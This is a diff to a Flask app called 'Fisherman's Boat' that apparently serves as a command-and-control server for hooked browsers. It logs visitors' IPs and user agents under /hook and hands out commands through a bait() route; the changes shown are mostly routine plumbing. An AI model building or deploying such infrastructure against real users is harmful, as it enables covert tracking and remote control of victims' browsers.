@@ -1,14 +1,19 @@
-from flask import Flask, jsonify, render_template, abort, request, session
+from flask import Flask, jsonify, render_template, abort, request, session, send_from_directory
 from flask_admin import Admin as FlaskAdmin
 from flask_sqlalchemy import SQLAlchemy
+from werkzeug.middleware.proxy_fix import ProxyFix
 import flask_login as login
 from datetime import datetime
 import base64
+import os
 from app.views.admin import MyAdminIndexView, HookModelView, CommandView
 
 app = Flask(__name__)
 app.config.from_pyfile("config.py")
 
+app.wsgi_app = ProxyFix(
+    app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1
+)
 
 admin = FlaskAdmin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_view=MyAdminIndexView())
 
@@ -79,8 +84,12 @@ def load_user(user_id):
 def index():
     return render_template('index.html')
 
+@app.route('/favicon.ico')
+def favicon():
+    return send_from_directory(os.path.join(app.root_path, 'static'),
+                          'favicon.ico',mimetype='image/vnd.microsoft.icon')
 
-@app.route('/hook', methods=['POST'])
+@app.route('/hook', methods=['GET', 'POST'])
 def hook():
     user_agent = request.headers.get('User-Agent')
     ip_address = request.remote_addr
@@ -99,9 +108,7 @@ def hook():
         user_agent=user_agent,
         ip_address=ip_address
     )
-    new_command_manager = Command()
     db.session.add(new_hook)
-    db.session.add(new_command_manager)
     db.session.commit()
 
     session['hook_id'] = new_hook.id
@@ -116,7 +123,7 @@ def alive():
     return jsonify(message='Hello')
 
 
-@app.route('/command', methods=['POST'])
+@app.route('/command', methods=['GET', 'POST'])
 def bait():
     hook_id = session.get('hook_id')
     if not hook_id:
